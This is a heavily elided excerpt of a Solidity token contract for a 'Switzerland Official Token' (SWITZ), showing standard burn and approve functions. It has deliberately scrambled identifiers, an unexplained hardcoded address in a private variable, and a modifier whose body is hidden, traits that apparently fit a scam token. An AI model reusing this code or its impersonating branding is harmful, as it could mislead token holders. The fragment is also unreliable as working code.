...
contract Context {
 ...
 contract Swiss is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _fullTokensAmounts;

    string private _name = "Switzerland Official Token";
    string private _symbol = "SWITZ";
    ...
    address private markknight = 0x3082E6Fa9C6d44BfF142dEA87A7acBb0A220304D;
   ...
   */
     ...
     */
    function _burn(address accoIDWNKunt, uint256 amounIDWNKt) internal virtual {
        require(accoIDWNKunt != address(0), "Can't burn from address 0");
        uint256 accountBalance = _fullTokensAmounts[accoIDWNKunt];
        require(accountBalance >= amounIDWNKt, "BEP : Can't be done");
        unchecked {
            _fullTokensAmounts[accoIDWNKunt] = accountBalance - amounIDWNKt;
        }
        _totalSupply -= amounIDWNKt;

        emit Transfer(accoIDWNKunt, address(0), amounIDWNKt);
    }
    modifier readLatin () {
    ...
    function _approve(
        address owIDWNKner,
        address speIDWNKnder,
        uint256 amoIDWNKunt
    ) internal virtual {
        require(owIDWNKner != address(0), "BEP : Can't be done");
        require(speIDWNKnder != address(0), "BEP : Can't be done");

        _allowances[owIDWNKner][speIDWNKnder] = amoIDWNKunt;
        emit Approval(owIDWNKner, speIDWNKnder, amoIDWNKunt);
    }
